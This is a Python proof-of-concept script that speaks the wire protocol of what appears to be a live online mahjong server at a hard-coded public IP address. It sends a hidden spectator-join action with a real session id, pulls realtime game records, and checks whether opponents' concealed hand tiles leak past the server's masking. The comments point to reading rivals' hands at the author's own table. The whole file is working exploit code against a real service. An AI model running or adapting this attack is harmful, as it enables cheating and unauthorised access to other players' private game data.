"""PoC v6 (D11 SEEGAME2=9): try the hidden 'spectator-can-join-empty-table' action.

Strategy:
  1. Reuse PoC v5 wire/handshake (sub_type=processid, lobby 5748, payload AES-CFB128 fresh-from-IV).
  2. After handshake, send ReqJoinBoxRoom with action=SEEGAME2(9) BEFORE ReqRealtimeGameRecord.
     - msg_type = 13 (CMDT_REQUEST_JOIN_TABLE), processid = 84 (RoomProtocol)
     - body layout per RoomProtocol.lua:188-238 ReqJoinTable bostream
  3. Watch for RespJoinTable (msg=14) errorcode:
     - SUCCESS (0)         → good; subsequent 0x2BC0 deals will reveal whether view filter is bypassed
     - ERROR_TABLE_START   → table already started but join allowed; same as SUCCESS for our purpose
     - SHOW_MESSAGE / NOT_TEA_HOUSE_RIGHT / NOT_EMPTY_TABLE → server ACL'd action=9
     - any other error     → action=9 not whitelisted for our user
  4. If RespJoinTable.errorcode == 0, send ReqRealtimeGameRecord(3000) and dump 0x2BC0 deal body[18:25].
     - if body[18:25] != 7×0x3c → H16 BREACHED via SEEGAME2 path (huge result)
     - if still 7×0x3c        → H16 covers SEEGAME2 too; document and move on to D23

Note on identify field:
  PlayerConnect uses identify=b"020000000000" (placeholder, server accepts).
  ReqJoinBoxRoom also has identify field — uses the same placeholder.
  Real game uses RC4-encrypted hw fingerprint via SysTool:GetDevid; we don't need that here.

Wire of ReqJoinTable (msg_type=13, processid=84):
  i32 askid
  i32 areatypeid
  i32 roomid
  i32 clienttype  (2=MOBILE)
  i32 hardwareflag
  i32 ver
  i32 channelid
  u8  ntype
  i32 osver
  string identify  (1B len + data)
  bool reconnect   (1B)
  i32 clienttypecustom
  string nickname
  string nickname2
  string headurl
  i32 lobbyid
  string logicData
  string acOtherInfo
  u8 action        ← SEEGAME2 = 9

Note: payload should be CFB-encrypted fresh-from-IV with session key (same convention as 3000).
"""
from __future__ import annotations

import argparse
import logging
import struct
import sys
import time
import zlib
from pathlib import Path

ECS_ROOT = "/opt/mahjong-remote"
if ECS_ROOT not in sys.path:
    sys.path.insert(0, ECS_ROOT)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("a4v6")


FLAG = 0x4001
HDR_LEN = 12

# Protocol IDs
ROOM_PROTOCOL_PROCESSID = 84
IM_PROTOCOL_PROCESSID = 100

# Message IDs (XY_ID values)
MSG_REQ_JOIN_TABLE = 13     # CMDT_REQUEST_JOIN_TABLE
MSG_RESP_JOIN_TABLE = 14    # CMDT_RESPONSE_JOIN_TABLE
MSG_REQ_REALTIME_GAME_RECORD = 3000
MSG_RESP_REALTIME_GAME_RECORD = 3001

# Action enum
ACTION_SITDOWN = 1
ACTION_SEEGAME = 4
ACTION_SEEGAME2 = 9

# RoomProtocol error codes (partial; exhaustive list lives in RoomProtocol.lua ERRORCODE = {...})
ERR_SUCCESS = 0


def pack_frame_v6(msg_type: int, payload: bytes, processid: int, appid: int) -> bytes:
    return struct.pack("<HHHHI", FLAG, len(payload), msg_type, processid, appid) + payload


def _wstr(b: bytes) -> bytes:
    """IStream.writeString = 1-byte length + data (per playerconnect.py confirmation)."""
    if len(b) > 255:
        raise ValueError(f"string >255 bytes: {len(b)}")
    return bytes([len(b)]) + b


def build_req_join_table(askid: int, roomid: int, action: int,
                         areatypeid: int = 0, lobbyid: int = 0,
                         clienttype: int = 2, identify: bytes = b"020000000000",
                         nickname: bytes = b"", nickname2: bytes = b"",
                         headurl: bytes = b"", logic_data: bytes = b"",
                         ac_other_info: bytes = b"") -> bytes:
    """Build ReqJoinTable body matching RoomProtocol.ReqJoinTable.bostream order."""
    bos = bytearray()
    bos += struct.pack("<i", askid)
    bos += struct.pack("<i", areatypeid)
    bos += struct.pack("<i", roomid)
    bos += struct.pack("<i", clienttype)
    bos += struct.pack("<i", 0)            # hardwareflag = HF_NONE
    bos += struct.pack("<i", 0)            # ver
    bos += struct.pack("<i", 0)            # channelid
    bos.append(0)                           # ntype (uint8)
    bos += struct.pack("<i", 0)            # osver
    bos += _wstr(identify)                  # identify
    bos.append(0)                           # reconnect (bool, 1B = false)
    bos += struct.pack("<i", 0)            # clienttypecustom
    bos += _wstr(nickname)                  # nickname
    bos += _wstr(nickname2)                 # nickname2 (UTF-8)
    bos += _wstr(headurl)                   # headurl
    bos += struct.pack("<i", lobbyid)      # lobbyid
    bos += _wstr(logic_data)                # logicData
    bos += _wstr(ac_other_info)             # acOtherInfo
    bos.append(action & 0xff)               # action (uint8)
    return bytes(bos)


def parse_resp_join_table(body: bytes) -> dict:
    """Parse RespJoinTable body matching RoomProtocol.RespJoinTable.bistream order.

    bistream has variable msgbox section if errorcode == SHOW_MESSAGE.
    We grab the fixed fields up to chairid then errorcode-driven branches.
    """
    if len(body) < 1 + 4 * 8 + 1:  # state + 8×i32 + chairid
        return {"_truncated": True, "_len": len(body)}
    p = 0
    state = body[p]; p += 1
    errorcode, askid, roommode, gameappid, roomid, gameid, tableid = struct.unpack_from("<iiiiiii", body, p)
    p += 28
    chairid = body[p]; p += 1
    return {
        "state": state,
        "errorcode": errorcode,
        "askid": askid,
        "roommode": roommode,
        "gameappid": gameappid,
        "roomid": roomid,
        "gameid": gameid,
        "tableid": tableid,
        "chairid": chairid,
        "_consumed": p,
        "_total": len(body),
    }


def parse_spectator_resp(payload: bytes) -> dict | None:
    """Same as PoC v5 RespRealtimeGameRecord parser."""
    if len(payload) < 32:
        return None
    askid, flag, room_id, max_offset = struct.unpack_from("<iiii", payload, 0)
    current, total, zip_flag, payload_size = struct.unpack_from("<iiii", payload, 16)
    data = payload[32:32 + payload_size] if payload_size > 0 and len(payload) >= 32 + payload_size else b""
    return {
        "askid": askid, "flag": flag, "room_id": room_id, "max_offset": max_offset,
        "current": current, "total": total, "zip": zip_flag,
        "payload_size": payload_size, "data": data,
    }


def main():
    p = argparse.ArgumentParser(description="PoC v6: SEEGAME2=9 then ReqRealtimeGameRecord")
    p.add_argument("--srs-sessionid", required=True, help="32 hex (主号)")
    p.add_argument("--userid", default="newpt1084306678")
    p.add_argument("--lobby-host", default="47.96.101.155")
    p.add_argument("--lobby-port", type=int, default=5748)
    p.add_argument("--room-id", type=int, required=True, help="主号桌 roomid")
    p.add_argument("--game-id", type=int, required=True, help="主号桌 gameid")
    p.add_argument("--action", type=int, default=ACTION_SEEGAME2,
                   help="SITDOWN=1 SEEGAME=4 SEEGAME2=9 (default 9)")
    p.add_argument("--processid-room", type=int, default=ROOM_PROTOCOL_PROCESSID,
                   help="RoomProtocol.processid (default 84)")
    p.add_argument("--processid-im", type=int, default=IM_PROTOCOL_PROCESSID,
                   help="IMProtocol.processid for ReqRealtimeGameRecord (default 100)")
    p.add_argument("--appid", type=int, default=0)
    p.add_argument("--listen-secs", type=int, default=30)
    p.add_argument("--no-encrypt", action="store_true",
                   help="不加密 ReqJoinBoxRoom/ReqRealtimeGameRecord 的 payload")
    p.add_argument("--skip-spectator", action="store_true",
                   help="只发 ReqJoinBoxRoom，不发 ReqRealtimeGameRecord")
    p.add_argument("--also-action4", action="store_true",
                   help="先发 action=SEEGAME=4 比对，再发 action=SEEGAME2=9")
    p.add_argument("--before-round", type=int, default=0)
    p.add_argument("--offset", type=int, default=0)
    args = p.parse_args()

    from remote.srs_spectator.client import SRSClient

    received_join_resps: list[dict] = []
    received_records: list[bytes] = []
    received_resp_frames: list[dict] = []
    fragments: dict[int, dict] = {}
    all_frames: list[tuple[int, bytes]] = []

    def parse_record_payload(data: bytes, askid: int):
        """Walk inner 0x2BC0/0x2BC1 frames inside zlib-decompressed record."""
        offset = 0
        cnt = 0
        while offset + 12 <= len(data) and cnt < 500:
            head = data[offset:offset + 12]
            pay_len = int.from_bytes(head[2:4], "little")
            mt = int.from_bytes(head[4:6], "little")
            if pay_len > 0 and offset + 12 + pay_len <= len(data) and mt in (0x2BC0, 0x2BC1):
                body = data[offset + 12:offset + 12 + pay_len]
                if len(body) >= 4:
                    sc = int.from_bytes(body[0:2], "little")
                    dl = int.from_bytes(body[2:4], "little")
                    sub_body = body[4:4 + dl]
                    if sc == 0x0003 and len(sub_body) >= 25:
                        h13_self = list(sub_body[:13])
                        opp7 = list(sub_body[18:25])
                        is_3c_opp = all(x == 0x3c for x in opp7)
                        logger.warning(
                            "    🔥 DEAL self_hand[:13]=%s opp_slot[18:25]=%s opp_is_3c=%s",
                            h13_self, opp7, is_3c_opp,
                        )
                        if not is_3c_opp:
                            logger.error(
                                "    💥💥💥 H16 BREACHED via action=%d ! opp_slot != 0x3c", args.action)
                    elif sc == 0x0216 and len(sub_body) >= 3:
                        pl, _, ct = sub_body[0], sub_body[1], sub_body[2]
                        if 0 < ct <= 20 and len(sub_body) >= 3 + ct:
                            h = list(sub_body[3:3 + ct])
                            logger.warning(
                                "    🔥 HAND_UPDATE player=%d count=%d hand=%s has_3c=%s",
                                pl, ct, h, 0x3c in h)
                    elif sc == 0x022B and len(sub_body) >= 14:
                        # round_result! bonus capture
                        logger.error("    🎰 ROUND_RESULT (0x022B) body=%s",
                                     sub_body[:64].hex())
            offset += 12 + max(0, pay_len)
            cnt += 1

    def handle_resp_join_table(payload_dec: bytes):
        info = parse_resp_join_table(payload_dec)
        logger.error("[RespJoinTable] %s", info)
        received_join_resps.append(info)

    def handle_spectator_resp(payload: bytes):
        meta = parse_spectator_resp(payload)
        if not meta:
            logger.warning("[3001] short %dB head=%s", len(payload), payload[:32].hex())
            return
        logger.warning("[3001] askid=%d flag=%d room_id=%d max_off=%d cur=%d total=%d zip=%d size=%d",
                       meta["askid"], meta["flag"], meta["room_id"], meta["max_offset"],
                       meta["current"], meta["total"], meta["zip"], meta["payload_size"])
        received_resp_frames.append(meta)
        if meta["flag"] == 1 or meta["zip"] != 1 or meta["total"] == 0:
            return
        f = fragments.setdefault(meta["askid"], {"total": meta["total"], "parts": {}})
        f["total"] = meta["total"]
        if meta["data"]:
            f["parts"][meta["current"]] = meta["data"]
        if len(f["parts"]) >= meta["total"]:
            merged = b"".join(f["parts"][i] for i in range(1, meta["total"] + 1) if i in f["parts"])
            try:
                rec = zlib.decompress(merged)
            except zlib.error as e:
                logger.error("zlib err %s", e)
                return
            logger.warning("=== 🎯 RECORD %d bytes ===", len(rec))
            received_records.append(rec)
            outp = Path(f"/tmp/a4v6_record_{int(time.time())}.bin")
            outp.write_bytes(rec)
            logger.info("[saved] %s", outp)
            parse_record_payload(rec, meta["askid"])

    sent_askids: list[int] = []

    def send_req_join_box_room(action: int, label: str, encrypt: bool = True):
        askid = int(time.time() * 1000) & 0x7FFFFFFF
        sent_askids.append(askid)
        body = build_req_join_table(askid=askid, roomid=args.room_id, action=action)
        if encrypt and client._crypto.key:
            client._crypto.reset_cfb()
            enc_body = client._crypto.encrypt_payload(body)
        else:
            enc_body = body
        frame = pack_frame_v6(MSG_REQ_JOIN_TABLE, enc_body,
                              processid=args.processid_room, appid=args.appid)
        logger.error("=> [%s] ReqJoinBoxRoom action=%d askid=%d roomid=%d enc=%s body_len=%d wire_len=%d",
                     label, action, askid, args.room_id, encrypt, len(body), len(frame))
        logger.info("    body_hex=%s", body.hex())
        logger.info("    wire_hex=%s", frame.hex())
        client._send_raw(frame)

    def send_req_realtime_game_record(encrypt: bool = True):
        askid = int(time.time() * 1000) & 0x7FFFFFFF
        sent_askids.append(askid)
        body = struct.pack("<iiii", askid, args.room_id, args.offset, args.before_round)
        if encrypt and client._crypto.key:
            client._crypto.reset_cfb()
            enc_body = client._crypto.encrypt_payload(body)
        else:
            enc_body = body
        frame = pack_frame_v6(MSG_REQ_REALTIME_GAME_RECORD, enc_body,
                              processid=args.processid_im, appid=args.appid)
        logger.error("=> [spectator] ReqRealtimeGameRecord askid=%d roomid=%d before_round=%d enc=%s",
                     askid, args.room_id, args.before_round, encrypt)
        client._send_raw(frame)

    def on_frame(msg_type, payload):
        all_frames.append((msg_type, payload))
        # RespJoinTable: server may send encrypted (need decrypt) or plaintext
        if msg_type == MSG_RESP_JOIN_TABLE:
            logger.info("<< RespJoinTable %dB head=%s", len(payload), payload[:48].hex())
            # try plain first
            try:
                handle_resp_join_table(payload)
            except Exception:
                pass
            # try AES decrypt
            try:
                client._crypto.reset_cfb()
                dec = client._crypto.decrypt_payload(payload)
                logger.info("    aes-dec head=%s", dec[:48].hex())
                handle_resp_join_table(dec)
            except Exception:
                pass
            return
        if msg_type == MSG_RESP_REALTIME_GAME_RECORD:
            logger.info("<< 0x0bb9 (3001) %dB", len(payload))
            handle_spectator_resp(payload)
            return
        if msg_type in (9, 0x0009):
            if len(payload) >= 4:
                ec_pt = int.from_bytes(payload[:4], "little", signed=True)
                logger.warning("    SRS ERR plain ec=%d body=%s", ec_pt, payload[4:].hex())
            return
        logger.info("<< 0x%04x %dB head=%s", msg_type, len(payload), payload[:32].hex())

    def on_handshake_done():
        logger.warning("=== handshake done; user authenticated ===")
        time.sleep(0.5)
        encrypt = not args.no_encrypt

        if args.also_action4:
            send_req_join_box_room(ACTION_SEEGAME, "compare-action4", encrypt=encrypt)
            time.sleep(2.0)

        send_req_join_box_room(args.action, f"primary-action{args.action}", encrypt=encrypt)
        time.sleep(2.0)

        if args.skip_spectator:
            return
        # Whether RespJoinTable success or not, try ReqRealtimeGameRecord —
        # PoC v5 已证 spectator 协议**不依赖**前置 SEEGAME（直接发 3000 也成功）。
        # 这里我们先发 SEEGAME2=9 让服务端的"位掩码/路径标记"切到旁观分支，再发 3000 看推送是否变化。
        send_req_realtime_game_record(encrypt=encrypt)

    client = SRSClient(
        host=args.lobby_host, port=args.lobby_port,
        auth_token="", handshake_blob="",
        srs_sessionid=args.srs_sessionid,
        userid=args.userid,
    )
    client.on_frame(on_frame)
    client.on_handshake_done(on_handshake_done)

    if not client.connect(timeout=10.0):
        logger.error("connect failed")
        return 1

    deadline = time.time() + args.listen_secs
    try:
        while time.time() < deadline:
            time.sleep(1.0)
            if received_records:
                logger.info("got record, exiting early")
                break
    except KeyboardInterrupt:
        pass

    client.disconnect()

    logger.warning("=== Total %d frames, %d RespJoinTable, %d 3001, %d records ===",
                   len(all_frames), len(received_join_resps),
                   len(received_resp_frames), len(received_records))

    # final verdict
    if received_join_resps:
        last = received_join_resps[-1]
        ec = last.get("errorcode")
        if ec == 0:
            logger.error("✅ ReqJoinBoxRoom action=%d errorcode=0 SUCCESS", args.action)
        else:
            logger.error("❌ ReqJoinBoxRoom action=%d errorcode=%d (rejected)", args.action, ec)
    else:
        logger.error("❌ NO RespJoinTable received — server silently dropped")

    return 0 if received_records else (3 if received_resp_frames else 2)


if __name__ == "__main__":
    sys.exit(main())
